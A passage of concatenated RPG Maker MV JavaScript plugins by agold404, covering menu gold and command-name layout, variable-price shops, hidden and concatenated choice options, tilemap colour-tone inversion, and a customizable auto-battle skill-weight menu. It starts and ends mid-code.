	return rtv;
},t).add('createGold',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._gold_number) this._gold_number.forEach(f.tbl.hideMogGold);
	this._conf_cmdPos=this.getConfig_cmdPos();
	if(this._goldSprite) console.warn("not expected already having this._goldSprite");
	const conf=this.getConfig_cmdPos();
	const sp=this._goldSprite=new Sprite(new Bitmap(conf.goldw,conf.goldh));
	if(f.tbl.hasMog) sp.bitmap.fontSize=Moghunter.scMenu_playTimeNumberFontSize; // same as time
	sp.x=conf.goldx;
	sp.y=conf.goldy;
	(this._field||this).addChild(sp);
	sp._lastVal=undefined;
	this.refreshGold();
	return rtv;
},t).add('getGoldVal',function f(){
	if(f.ori) console.warn("not expected having f.ori");
	let gold=$gameParty.gold(); if($gameParty.maxGold()<gold && f.tbl.hasYep && Yanfly.Param && Yanfly.Param.GoldOverlap) gold=Yanfly.Param.GoldOverlap;
	return gold;
},t).add('refreshGold',function f(forced){
	if(f.ori) console.warn("not expected having f.ori");
	const gold=this.getGoldVal(),sp=this._goldSprite,conf=this.getConfig_cmdPos();
	if(!conf || !sp || !sp.bitmap || (!forced && sp._lastVal===gold)) return;
	sp.bitmap.clear();
	sp.bitmap.drawText(''+(sp._lastVal=gold),0,0,conf.goldw,conf.goldh,conf.golda);
},t).add('_getConfig_cmdPos',function f(){
	if(f.ori) console.warn("not expected having f.ori");
	const t=f.tbl;
	const re=t.re,raw=ImageManager.otherFiles_getData(t.path);
	const data=raw&&raw.replace(re.r,''); if(!data) console.warn("file:\n",t.path,"\n","not loaded or is empty");
	const func=data?console.warn:console.log;
	let cw,px,py,nx,ny,nw,nh,ndx,ndy,gx,gy,gw,gh,ga,gfsz; if(data){ let m;
		if(m=data.match(re.cmdw)) cw=Number(m[2]);
		if(m=data.match(re.padx)) px=Number(m[2]);
		if(m=data.match(re.pady)) py=Number(m[2]);
		if(m=data.match(re.namex)) nx=Number(m[2]);
		if(m=data.match(re.namey)) ny=Number(m[2]);
		if(m=data.match(re.namew)) nw=Number(m[2]);
		if(m=data.match(re.nameh)) nh=Number(m[2]);
		if(m=data.match(re.namedx)) ndx=Number(m[2]);
		if(m=data.match(re.namedy)) ndy=Number(m[2]);
		if(m=data.match(re.goldx)) gx=Number(m[2]);
		if(m=data.match(re.goldy)) gy=Number(m[2]);
		if(m=data.match(re.goldw)) gw=Number(m[2]);
		if(m=data.match(re.goldh)) gh=Number(m[2]);
		if(m=data.match(re.golda)) ga=m[2];
	}
	if(isNaN(cw  )) func.apply(console,["set cmdw =",cw=t.defaults.cmdw]);
	if(isNaN(px  )) func.apply(console,["set padx =",px=t.defaults.padx]);
	if(isNaN(py  )) func.apply(console,["set pady =",py=t.defaults.pady]);
	if(isNaN(nx  )) func.apply(console,["set namex =",nx=t.defaults.namex]);
	if(isNaN(ny  )) func.apply(console,["set namey =",ny=t.defaults.namey]);
	if(isNaN(nw  )) func.apply(console,["set namew =",nw=t.defaults.namew]);
	if(isNaN(nh  )) func.apply(console,["set nameh =",nh=t.defaults.nameh]);
	if(isNaN(ndx )) func.apply(console,["set namedx =",ndx=t.defaults.namedx]);
	if(isNaN(ndy )) func.apply(console,["set namedy =",ndy=t.defaults.namedy]);
	if(isNaN(gx  )) func.apply(console,["set goldx =",gx=t.defaults.goldx]);
	if(isNaN(gy  )) func.apply(console,["set goldy =",gy=t.defaults.goldy]);
	if(isNaN(gw  )) func.apply(console,["set goldw =",gw=t.defaults.goldw]);
	if(isNaN(gh  )) func.apply(console,["set goldh =",gh=t.defaults.goldh]);
	if(ga===undefined) func.apply(console,["set golda =",ga=t.defaults.golda]);
	if(f.tbl.hasMog){
		Moghunter.scMenu_ComNameX=nx;
		Moghunter.scMenu_ComNameY=ny;
	}
	return ({
		cmdw:cw,padx:px,pady:py,
		goldx:gx,goldy:gy,goldw:gw,goldh:gh,
		golda:ga,
		namex:nx,namey:ny,namew:nw,nameh:nh,namedx:ndx,namedy:ndy,
	});
},t).add('getConfig_cmdPos',function f(){
	return this._conf_cmdPos||(this._conf_cmdPos=this._getConfig_cmdPos());
},t).add('initialize',function f(){
	const im=ImageManager;
	im.otherFiles_delData(f.tbl.path);
	im.otherFiles_addLoad(f.tbl.path);
	const rtv=f.ori.apply(this,arguments);
	this._cmdPos_terminated=false;
	this._conf_cmdPos=undefined;
	f.tbl.hasMog=typeof Moghunter !=='undefined';
	f.tbl.hasYep=typeof Yanfly    !=='undefined';
	return rtv;
},t).add('terminate',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._cmdPos_terminated=true;
	return rtv;
},t).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.refreshGold();
	return rtv;
},t).add('createCommandName',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(f.tbl.hasMog){
		const conf=this.getConfig_cmdPos();
		this._commandName.bitmap=new Bitmap(conf.namew,conf.nameh);
		this._commandName.anchor.x=0.5;
	}
	return rtv;
},t).add('refreshCommandName',function f(){
	if(f.tbl.hasMog){
		const conf=this.getConfig_cmdPos();
		this._commandNameIndex = this._commandWindow._index;
		this._commandNameIndex2 = -2;
		this._commandName.bitmap.clear();
		this.drawCmdName(this._comList[this._commandNameIndex].name);
	}else return f.ori.apply(this,arguments);
},t).add('refreshActorName',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(f.tbl.hasMog){
		this._commandNameIndex = -2;
		this._commandNameIndex2 = this._statusWindow._index;
		this._commandName.bitmap.clear();
		const actor=$gameParty.members()[this._statusWindow._index];
		if(!actor) return;
		this.drawCmdName(actor.name());
	}
	return rtv;
},t).add('drawCmdName',function f(txt){
	if(f.ori) console.warn("not expected having f.ori");
	// cmd name, actr name. supposed bitmap cleared, first draw, so opacity=0
	const conf=this.getConfig_cmdPos();
	this._commandName.bitmap.drawText(txt,0,0,conf.namew,conf.nameh,"center");
	this._commandName.x=conf.namex+conf.namedx;
	this._commandName.y=conf.namey+conf.namedy;
	this._commandName.opacity=0;
}).add('isOnSprite_cmd',function f(sp){
	const w=sp.width,h=sp.height,a=sp.anchor;
	const x=sp.x-a.x*w,y=sp.y-a.y*h;
	if(!sp.visible || !sp.opacity) return false;
	const dx=TouchInput.x-x,dy=TouchInput.y-y;
	if(dy<0||dy>=h) return false;
	const slope=f.tbl.sideSlopes[sp._cmdPos_side|0];
	const a1=slope,b1=slope<0?h:0;
	if(f.tbl.lineVal(a1,b1,dx,dy)/a1<0 || f.tbl.lineVal(a1,b1,dx-f.tbl.btmWidth,dy)/a1>=0) return false;
	// a<0
	return true;	
},t);
t=undefined;

})();


﻿"use strict";
/*:
 * @plugindesc 變數價格商店
 * @author agold404
 * @help .
 * 
 * $gameTemp.varBuyPrice=[ [type,itemId,varId_or_jsFunc,n-th], ... ];
 * type = 'i' or 'w' or 'a'
 * n-th counts from 1, meaning only n-th type[itemId] apply this varPrice. if n-th not >0, then it will apply to all type[itemId] goods.
 * fractions in n-th will be tructated.
 * value of n-th not >0 treated same.
 * same n-th setting to same item use last config.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t='deprecated function. please use ';

cf(
cf(
Scene_Shop.prototype,'terminate',function f(){
	const rtv=f.ori.apply(this,arguments);
	$gameTemp.varBuyPrice=undefined;
	return rtv;
}),'buyingPrice',function f(){
	const w=this._buyWindow;
	return w.priceByIdx(w.index());
},undefined,true,true);

cf(
cf(
cf(
cf(
cf(
cf(
cf(
cf(
Window_ShopBuy.prototype,'makeItemList',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._priceByFunc) this._priceByFunc.clear(); else this._priceByFunc=new Map();
	if(!f.tbl) f.tbl=new Map([['i',$dataItems],['w',$dataWeapons],['a',$dataArmors]]);
	if($gameTemp.varBuyPrice && $gameTemp.varBuyPrice.length>=0){
		const data=new Map(),arr=$gameTemp.varBuyPrice,ctr=new Map();
		for(let x=0;x!==arr.length;++x){
			const cont=f.tbl.get(arr[x][0]);
			const dataobj=cont&&cont[arr[x][1]]; if(!dataobj) continue;
			let m=data.get(dataobj); if(!m) data.set(dataobj,m=new Map());
			arr[x][3]|=0;
			m.set(0<arr[x][3]?arr[x][3]:undefined,arr[x][2]);
		}
		for(let x=0,arr=this._data;x!==arr.length;++x){ if(data.has(arr[x])){
			const cnt=(ctr.get(arr[x])|0)+1;
			ctr.set(arr[x],cnt);
			const m=data.get(arr[x]);
			let info; // gameVarId or jsFunc
			if(m.has(cnt)) info=m.get(cnt);
			else if(m.has(undefined)) info=m.get(undefined);
			else continue;
			if(info!==undefined){
				if(info && info.constructor===Function){
					this._priceByFunc.set(info,this._price[x]=info());
				}else this._price[x]=$gameVariables.value(info);
			}
		} }
	}
	return rtv;
}),'price',function f(){
	console.warn(f.tbl[0]);
	alert(f.tbl[0]);
	debugger;
	return f.ori.apply(this,arguments);
},[t+'priceByIdx',]),'isEnabledByIdx',function f(idx){
	return this._data[idx] && this.priceByIdx(idx) <= this._money && !$gameParty.hasMaxItems(this._data[idx]);
},undefined,true,true),'isEnabled',function f(){
	console.warn(f.tbl[0]);
	alert(f.tbl[0]);
	debugger;
	return f.ori.apply(this,arguments);
},[t+'isEnabledByIdx',]),'drawItem',function f(idx){
	const item = this._data[idx] , rect = this.itemRect(idx) , priceWidth = f.tbl[0];
	rect.width-=this.textPadding();
	this.changePaintOpacity(this.isEnabledByIdx(idx));
	this.drawItemName(item, rect.x, rect.y, rect.width - priceWidth);
	this.drawText(this.priceByIdx(idx), rect.x + rect.width - priceWidth, rect.y, priceWidth, 'right');
	this.changePaintOpacity(true);
},[96,],true,true),'priceByIdx',function f(idx){
	return this._price[idx]||0;
}),'isCurrentItemEnabled',function f(){
	return this.isEnabledByIdx(this.index());
},undefined,true,true),'update',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this.active && this._priceByFunc.size){
		const res={diff:false,};
		this._priceByFunc.forEach(f.tbl[0].bind(res));
		if(res.diff) this.refresh();
	}
	return rtv;
},[
function(v,k){
	if(k()!==v) this.diff=true;
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc 不顯示選項
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const oriIdx=15;

new cfc(Game_Interpreter.prototype).add('setupChoices',function f(params){
	const oriParam=params[oriIdx]||(params[oriIdx]=params[0].slice());
	const arr=this.setupChoices_dontShow_get(),choicesN=oriParam.length;
	let tbl=this._mappingTable; if(tbl) tbl.length=0; else tbl=this._mappingTable=[];
	params[0].length=0;
	for(let x=0,arrLen=arr.length;x!==choicesN;++x){
		if(!(arrLen && arr.uniqueHas(x))){
			params[0].push(oriParam[x]);
			tbl.push(x);
		}
	}
	if(params[1]>=0) params[1]=tbl[params[1]];
	return f.ori.apply(this,arguments);
}).add('setupChoices_callBack',function f(n){
	this._branch[this._indent]=this._mappingTable?this._mappingTable[n]:n;
},undefined,true,true).add('setupChoices_dontShow_get',function f(){
	let rtv=this._dontShow; if(!rtv) rtv=this._dontShow=[];
	return rtv;
}).add('setupChoices_dontShow_add',function f(idx){
	const arr=this.setupChoices_dontShow_get();
	for(let x=0,xs=arguments.length;x!==xs;++x) arr.uniquePush(arguments[x]);
	return this;
}).add('setupChoices_dontShow_del',function f(idx){
	const arr=this.setupChoices_dontShow_get();
	for(let x=arguments.length;x--;) arr.uniquePop(arguments[x]);
	return this;
}).add('setupChoices_dontShow_addRange',function f(idxMin,idxMax){
	for(let x=idxMin;x<=idxMax;++x) this.setupChoices_dontShow_add(x);
	return this;
}).add('setupChoices_dontShow_delRange',function f(idxMin,idxMax){
	for(let x=idxMax;x>=idxMin;--x) this.setupChoices_dontShow_del(x);
	return this;
}).add('setupChoices_dontShow_clear',function f(){
	this.setupChoices_dontShow_get().length=0;
}).add('setupChoices_dontShow_isPersistInThisInterpreter_set',function f(val){
	return this._isReserveInThisInterpreter=val;
}).add('setupChoices_dontShow_isPersistInThisInterpreter_get',function f(){
	return this._isReserveInThisInterpreter;
}).add('clear',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.setupChoices_dontShow_clear();
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 多組選項相連
 * @author agold404
 * @help 1-line comment: @CONCAT between two concequent "Show Choices"
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

/*
## build-in flow ##
when choose:
	set ($gameMessage) this._branch[this._indent] = n;
		// cancel: n=-2 ; others: from 0
*/

new cfc(Game_Interpreter.prototype).add('setupChoices',function f(params){
	this._setupChoices_concat(arguments);
	return f.ori.apply(this,arguments);
}).add('_setupChoices_concat_findCmdEnd',function f(strt,indent,setCmd402Param0From){
	// no error check
	// setCmd402Param0From:
	//	Expected to be int.
	//	if >=0, set following cmd402's param0 from 'setCmd402Param0From'.
	// 	i.e. the first encounting cmd402's param0 will be set to setCmd402Param0From, the second will be set to setCmd402Param0From+1, and so on.
	// cmd404 === cmd_ShowChoices's end
	let rtv=strt;
	for(const arr=this._list;arr[rtv]&&(indent<arr[rtv].indent||404!==arr[rtv].code);++rtv){
		if(setCmd402Param0From>=0 && indent===arr[rtv].indent && arr[rtv].code===402){
			arr[rtv].parameters[0]=setCmd402Param0From++;
		}
	}
	return rtv;
}).add('_setupChoices_concat',function f(args){
	// suppose params=args[0] and is the cmd object's parameters in '$dataMap'
	let b=this._index;
	const strt=b,indent=this._indent,cmds=this._list;
	if(cmds[strt]._setupChoices_concat_isDetected) return; // another detecting guard: not modifying again
	
	let params=args[0];
if(0){
	// prevent modifying oringinal data
	args[0]=params=params.slice();
	params[0]=params[0].slice();
}
	let cancelChoice=params[1];
	let defaultChoice=params[2];
	
	const setIndentTo=indent+1; // Math.max(999999,this._indent+99999); // match the behavior of 'skipBranch'
	for(let choicesCnt;;){
		b=this._setupChoices_concat_findCmdEnd(b,indent,choicesCnt)+1;
		//console.log(b); // debug
		if(!cmds[b-1] || cmds[b-1].indent<indent || !cmds[b] || cmds[b].code!==108 || !cmds[b].parameters || cmds[b].parameters[0]!==f.tbl[0] || !cmds[b+1] || cmds[b+1].code!==102) break;
		choicesCnt=params[0].length;
		++b;
		cmds[b].parameters[0].forEach(f.tbl[1],params[0]);
		// modify so that it won't be detected again.
		{
			// [... cmd0, chEnd, comment, ...]
			//                   ^b
			for(let x=3;x--;){
				cmds[b-x].code=0;
				cmds[b-x].indent=setIndentTo;
			}
		}
		//set first options
		// set cancel if needed
		if(!(cancelChoice>=0)&&cmds[b].parameters[1]>=0) cancelChoice=cmds[b].parameters[1]-(-choicesCnt);
		// set default if needed
		if(!(defaultChoice>=0)&&cmds[b].parameters[2]>=0) defaultChoice=cmds[b].parameters[2]-(-choicesCnt);
	}
	params[1]=cancelChoice;
	params[2]=defaultChoice;
	cmds[strt]._setupChoices_concat_isDetected=true; // another detecting guard
	return b;
},[
"@CONCAT",
function(chLabel){
	this.push(chLabel);
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc tilemapColorTone
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw='tilemapColorTone';
t=[kw,"_"+kw,];
t.push(t[1]+"_color",t[1]+"_ratio"); // 2,3
t.push(t[1]+"_ignore",t[1]+"_last"); // 4,5
for(let x=1;x!==6;++x) t.push((t[x]+"_get").slice(1),(t[x]+"_set").slice(1),);
t.push([undefined,undefined]); // 16
t.push(t[1]+"_dirty"); // 17
t.push(new Set([Tilemap,ShaderTilemap])); // 18
t.push(t[1]+"_toneFilter"); // 19: new ToneFilter()
t.push([
	-1,  0,  0,  1,  0,
	 0, -1,  0,  1,  0,
	 0,  0, -1,  1,  0,
	 0,  0,  0,  1,  0,
]); // 20: invert color matrix
t.push(t[1]+"_inverted"); // 21
t.push(t[0]+"_propagate"); // 22: function
t.push(function(v,i){return i<15?v<0?1-this*(1-v):this*v:v;}); // 23: invertColorMatrix.map(,ratio);

new cfc(ToneFilter.prototype).add('_spInvert',function f(ratio,isMul){
	ratio-=0; if(isNaN(ratio)) ratio=1;
	const arr=f.tbl[20].map(f.tbl[23],ratio);
	this._loadMatrix(arr,isMul);
},t).add('setInvert',function f(ratio){
	this.enabled=ratio;
	this._spInvert(ratio);
},t).add('pushInvert',function f(ratio){
	this._spInvert(ratio,true);
},t);

for(let x=0,arr=[Game_Screen,Sprite,Tilemap];x!==arr.length;++x){
new cfc(arr[x].prototype).add(t[6],function f(){
	return [this[f.tbl[2]]||undefined,this[f.tbl[3]],this[f.tbl[21]],];
},t).add(t[7],function f(c,r,isInverted){
	this[f.tbl[2]]=c;
	this[f.tbl[3]]=r;
	this[f.tbl[21]]=isInverted||undefined;
},t).add(t[8],function f(){
	return this[f.tbl[2]]&&this[f.tbl[2]].slice();
},t).add(t[9],function f(c){
	return this[f.tbl[2]]=c;
},t).add(t[10],function f(){
	return this[f.tbl[3]];
},t).add(t[11],function f(r){
	return this[f.tbl[3]]=r;
},t).add(t[12],function f(){
	return this[f.tbl[4]];
},t).add(t[13],function f(ignore){
	this[f.tbl[17]]=true;
	return this[f.tbl[4]]=ignore;
},t).add(t[14],function f(){
	return this[f.tbl[5]];
},t).add(t[15],function f(last){
	if(!(f.tbl[5] in this)) this[f.tbl[5]]=[undefined,undefined];
	this[f.tbl[5]][0]=last[0].slice();
	this[f.tbl[5]][1]=last[1];
	return this[f.tbl[5]];
},t);
}

new cfc(PIXI.Container.prototype).add(t[0],function f(){
	if(f.tbl[18].has(this.constructor)){
		// tilemap
		if(!(f.tbl[5] in this)) this[f.tbl[5]]=[undefined,undefined,undefined,];
		if(!(f.tbl[1] in this)) this[f.tbl[1]]=[undefined,undefined,undefined,];
		if($gameScreen) this[f.tbl[1]]=$gameScreen[f.tbl[6]]();
		if(!this[f.tbl[1]].equals(this[f.tbl[5]])){
			let preCal=undefined;
			if(!this[f.tbl[21]]) this[f.tbl[21]]=new ToneFilter();
			const c=this[f.tbl[1]][0],r=this[f.tbl[1]][1],invertedFilter=this[f.tbl[21]],invertRatio=this[f.tbl[1]][2];
			invertedFilter.setInvert(invertRatio);
			if(c&&r){
				preCal=[];
				for(let x=0;x!==c.length;++x) preCal.push(c[x]*r);
			}
			// this[f.tbl[17]]=true; // is it needed?
			this[f.tbl[22]](preCal,invertedFilter);
			this[f.tbl[5]]=this[f.tbl[1]]; // recorded as last
		}
	}else{
		if(!this[f.tbl[4]] && this[f.tbl[17]]){
			const invertedFilter=this[f.tbl[21]];
			const shouldInverted=invertedFilter&&invertedFilter.enabled;
			this[f.tbl[22]](this[f.tbl[1]],invertedFilter); // preCal,inverted?&&tilemap,
			let shouldClearFilter=false;
			if(this._refresh){
				if(!(this._invertedColor_after=shouldInverted)) shouldClearFilter=true;
				this._refresh();
			}else if(this.constructor===PIXI.tilemap.ZLayer){
				const c=this[f.tbl[1]];
				if(!this[f.tbl[19]]) this[f.tbl[19]]=new ToneFilter();
				let tmp=true;
				if(c){
					tmp=false;
					if(!this._filters) this._filters=[];
					const tf=this[f.tbl[19]];
					this._filters.uniquePush(tf);
					tf.reset();
					tf.adjustTone(c[0],c[1],c[2]);
					tf.adjustSaturation(-c[3]);
				}
				if(shouldInverted){
					tmp=false;
					if(!this._filters) this._filters=[];
					this._filters.uniquePush(invertedFilter);
				}
				if(!(shouldClearFilter=tmp)){
					if(!this.filterArea){
						const margin =48;
						const width  =Graphics.width  + (margin<<1);
						const height =Graphics.height + (margin<<1);
						this.filterArea=new Rectangle(-margin, -margin, width, height);
					}
				}
			}
			if(shouldClearFilter){
				if(this._filters){
					this._filters.uniquePop(this[f.tbl[19]]); // for ZLayer
					this._filters.uniquePop(invertedFilter);
					if(!this._filters.length){
						this._filters=null;
						this.filterArea=null;
					}
				}
			}
		}
		this[f.tbl[17]]=false;
	}
},t).add(t[22],function f(preCal,invertedFilter){
	for(let x=0,arr=this.children,xs=arr.length;x!==xs;++x){
		arr[x][f.tbl[17]]=true;
		arr[x][f.tbl[1]]=preCal;
		arr[x][f.tbl[21]]=invertedFilter;
	}
},t);
new cfc(Sprite.prototype).add('initialize',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	this[f.tbl[19]]=undefined;
	this._invertedColor_after=this._invertedColor_after_last=undefined;
	return rtv;
},t).add('_needsTint',function f(){
	const rtv=f.ori.apply(this,arguments);
	return rtv || this._invertedColor_after_last || this._invertedColor_after;
},t).add('_executeTint',function f(x,y,w,h){
	const ctx=this._context , tone=this._colorTone , color = this._blendColor;
	
	ctx.globalCompositeOperation = 'copy';
	ctx.drawImage(this._bitmap.canvas, x, y, w, h, 0, 0, w, h);
	
	this._executeTint_otherEffects_before(ctx,x,y,w,h);
	
	if (Graphics.canUseSaturationBlend() && 0<tone[3]){
		const gray = Math.max(0, tone[3]);
		ctx.globalCompositeOperation = 'saturation';
		ctx.fillStyle = 'rgba(255,255,255,' + (tone[3]-(-1)) / 256 + ')';
		ctx.fillRect(0, 0, w, h);
	}
	
	if(0<tone[0]||0<tone[1]||0<tone[2]){
		const r1 = Math.max(0, tone[0]);
		const g1 = Math.max(0, tone[1]);
		const b1 = Math.max(0, tone[2]);
		ctx.globalCompositeOperation = 'lighter';
		ctx.fillStyle = Utils.rgbToCssColor(r1, g1, b1);
		ctx.fillRect(0, 0, w, h);
	}
	
	if(tone[0]<0||tone[1]<0||tone[2]<0){
		if(Graphics.canUseDifferenceBlend()){
			ctx.globalCompositeOperation = 'difference';
			ctx.fillStyle = 'white';
			ctx.fillRect(0, 0, w, h);
			
			const r2 = Math.max(0, -tone[0]);
			const g2 = Math.max(0, -tone[1]);
			const b2 = Math.max(0, -tone[2]);
			ctx.globalCompositeOperation = 'lighter';
			ctx.fillStyle = Utils.rgbToCssColor(r2, g2, b2);
			ctx.fillRect(0, 0, w, h);
			
			ctx.globalCompositeOperation = 'difference';
			ctx.fillStyle = 'white';
			ctx.fillRect(0, 0, w, h);
		}
	}
	
	if(0<color[3]){
		const r3 = Math.max(0, color[0]);
		const g3 = Math.max(0, color[1]);
		const b3 = Math.max(0, color[2]);
		const a3 = Math.max(0, color[3]);
		ctx.globalCompositeOperation = 'source-atop';
		ctx.fillStyle = Utils.rgbToCssColor(r3, g3, b3);
		ctx.globalAlpha = a3 / 255;
		ctx.fillRect(0, 0, w, h);
	}
	
	this._executeTint_otherEffects_after(ctx,x,y,w,h);
	
	ctx.globalCompositeOperation = 'destination-in';
	ctx.globalAlpha = 1;
	ctx.drawImage(this._bitmap.canvas, x, y, w, h, 0, 0, w, h);
},t).add('_executeTint_otherEffects_before',function f(ctx,x,y,w,h){
},t).add('_executeTint_otherEffects_after',function f(ctx,x,y,w,h){
	this._executeTint_otherEffects_after_invert(ctx,x,y,w,h);
},t).add('_executeTint_otherEffects_after_invert',function f(ctx,x,y,w,h){
	if(!(this._invertedColor_after_last=this._invertedColor_after)) return;
	ctx.globalCompositeOperation = 'difference';
	const v=255*this._invertedColor_after;
	ctx.fillStyle = Utils.rgbToCssColor(v,v,v);
	ctx.fillRect(0, 0, w, h);
},t);
for(let x=0,arr=[PIXI.Container,Tilemap];x!==arr.length;++x){
new cfc(arr[x].prototype).add('renderCanvas',function f(){
	this[f.tbl[0]]();
	return f.ori&&f.ori.apply(this,arguments);
},t).add('renderWebGL',function f(){
	this[f.tbl[0]]();
	return f.ori&&f.ori.apply(this,arguments);
},t);
}

const f=function f(){
	if((f.tbl[1] in this)&&this[f.tbl[1]]&&!this[f.tbl[4]]&&!f.tbl[18].has(this.constructor)) return this[f.tbl[1]];
	else return this.__colorTone;
};
f.ori=undefined;
f.tbl=t;

Object.defineProperty(Sprite.prototype,'_colorTone',{
	get:f,
	set:function(rhs){
		return this.__colorTone=rhs;
	},
	configurable:true,
});

})();


﻿"use strict";
/*:
 * @plugindesc customizable auto-battle member
 * @author agold404
 * @help add <autoBattleCustomizable:total_skills_can_be_chosen_excluding_atk_and_def> in note of actor to activate customization feature
 * add <autoBattleCustomizable:integer> on other "traits" available things to increase/decrease the number, by addition and substraction.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t,a,p; const gbb=Game_BattlerBase;

const kwtxt='調整權重';
const kwbase='autoBattleCustomizable';
const kwtrait="TRAIT_"+kwbase;
const kwinfo="_"+kwbase+"_info";
const kwgetinfo="get_"+kwbase+"_info";

gbb.addEnum(kwtrait);

t=[
kwbase, // 0
kwtxt, // 1
'(empty)', // 2
kwtrait, // 3
gbb[kwtrait], // 4
kwgetinfo, // 5
kwinfo, // 6
info=>info&&info[0]&&0<info[1]-0, // 7
];


cf(Scene_Boot.prototype,'start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits; if(!ts) return;
	const v=meta[kwbase]-0;
	if(v) ts.push({code:gbb[kwtrait],dataId:0,value:v,});
},
]);


new cfc(gbb.prototype).add(t[0],function f(){
	return this.traitsSum(f.tbl[4],0);
},t).add(t[5],function f(){
	let rtv=this[f.tbl[6]]; if(!rtv) rtv=this[f.tbl[6]]=[[1,1],[2,1],];
	if(this.skills){
		const skills=new Set(this.skills());
		const ori=rtv.slice(2);
		rtv.length=2;
		for(let x=0,xs=ori.length;x!==xs;++x) if(ori[x]&&skills.has($dataSkills[ori[x][0]])) rtv.push(ori[x]);
	}
	return rtv;
},t);


a=function f(){
	this.initialize.apply(this,arguments);
};
window['Scene_CustomizingSkillWeight']=a;
p=a.prototype=Object.create(Scene_MenuBase.prototype);
p.constructor=a;

p.initialize=function f(){
	Scene_MenuBase.prototype.initialize.apply(this,arguments);
	const psc=this._prevScene=SceneManager._scene; // from Scene_Skill , no need snap bg.
	this._actor=psc&&psc._actor;
};
p.create=function f(){
	Scene_MenuBase.prototype.create.apply(this,arguments);
	this.createWindows();
};
new cfc(p).add('createWindows',function f(){
	const bh=Graphics.boxHeight;
	const wn=this._window_actorName = new Window_Help(1);
	const wc=this._window_customizing = new Window_CustomizingSkillWeight(0,wn.height);
	const wh=this._window_help = new Window_Help(3);
	const maxH=wc._maxHeight=(wh.y=bh-wh.height)-wn.height;
	const ws=this._window_skills = new Window_AllSkillList(wc.width,wn.height,wc.width,maxH);
	if(ws._actor=wc._actor=this._actor) wn.setText(this._actor.name());
	wc.makeCommandList();
	wc.height=wc.windowHeight();
	wc.refresh();
	ws.refresh();
	ws._customizing=wc;
	ws.setHelpWindow(wh);
	wc.setHandler(f.tbl[0],this.onChangeSkill.bind(this));
	wc.setHandler('cancel',this.popScene.bind(this));
	ws.setHandler('ok',this.onChangeSkillOk.bind(this));
	ws.setHandler('cancel',this.onChangeSkillCancel.bind(this));
	this.addWindow(wn);
	this.addWindow(wc);
	this.addWindow(ws);
	this.addWindow(wh);
},t,true,true).add('onChangeSkill',function f(){
	this._window_customizing.deactivate();
	this._window_skills.activate();
	if(this._window_skills.index()<0) this._window_skills.select(0);
},t,true,true).add('onChangeSkillOk',function f(){
	this._window_customizing.setCurrent(this._window_skills.item());
	this.onChangeSkillCancel();
},t,true,true).add('onChangeSkillCancel',function f(){
	this._window_skills.deactivate();
	this._window_customizing.activate();
},t,true,true);


a=function f(){
	this.initialize.apply(this,arguments);
};
window['Window_AllSkillList']=a;
p=a.prototype=Object.create(Window_SkillList.prototype);
p.constructor=a;

p.initialize=function f(){
	Window_SkillList.prototype.initialize.apply(this,arguments);
	this._maxCols=undefined;
};
p.maxCols=function(){
	return isNaN(this._maxCols)?1:this._maxCols;
};
p.isEnabled=p.includes=()=>true;


a=function f(){
	this.initialize.apply(this,arguments);
};
window['Window_CustomizingSkillWeight']=a;
p=a.prototype=Object.create(Window_Command.prototype);
p.constructor=a;

p.initialize=function f(){
	Window_Command.prototype.initialize.apply(this,arguments);
};
p.windowWidth=function f(){
	return Graphics.boxWidth>>1;
};
p.weightWidth=function(){
	return 64;
};
cf(p,'get_customWeights',function f(){
	const actr=this._actor;
	let rtv;
	if(actr) rtv=actr[f.tbl[5]]();
	return rtv;
},t);
cf(p,'setCurrent',function f(item){
	const cw=this.get_customWeights();
	if(cw){
		const idx=this.index(),id=item?item.id:0;
		if(cw[idx]) cw[idx][0]=id;
		else cw[idx]=[id,0];
		if(!this._list) this._list=[];
		this._list[idx]={name: cw[idx], symbol: f.tbl[0], enabled: true, ext: null};
		this.redrawItem(idx);
	}
},t);
p._adjWeight=function(idx,delta){
	const cw=this.get_customWeights();
	if(cw){
		if(!cw[idx]) this.setCurrent(0);
		let val=cw[idx][1];
		cw[idx][1]=Math.max(val+delta,0);
		if(cw[idx][1]!==val) this.redrawItem(idx);
	}
};
p.cursorLeft=function(){
	this._adjWeight(this.index(),-1-(Input.isPressed('shift'))*9);
};
p.cursorRight=function(){
	this._adjWeight(this.index(),1+(Input.isPressed('shift'))*9);
};
p.isCursorMovable=p.isOpenAndActive;
p.processWheel_th=()=>20;
p.processWheel=function f(){
	if(this.isOpenAndActive()){
		const th=this.processWheel_th(),absy=Math.abs(TouchInput.wheelY),absx=Math.abs(TouchInput.wheelX);
		if(absy>=th){
			if(TouchInput.wheelY<0) this.scrollUp();
			else this.scrollDown();
		}else if(absx>=th){
			if(TouchInput.wheelX<0) this.cursorLeft();
			else this.cursorRight();
		}
	}
};
new cfc(p).add('makeCommandList',function f(){
	const cw=this.get_customWeights(); if(!cw) return;
	if(!cw[0]) cw[0]=[1,1];
	if(!cw[1]) cw[1]=[2,1];
	this.addCommand(cw[0],'atk',false);
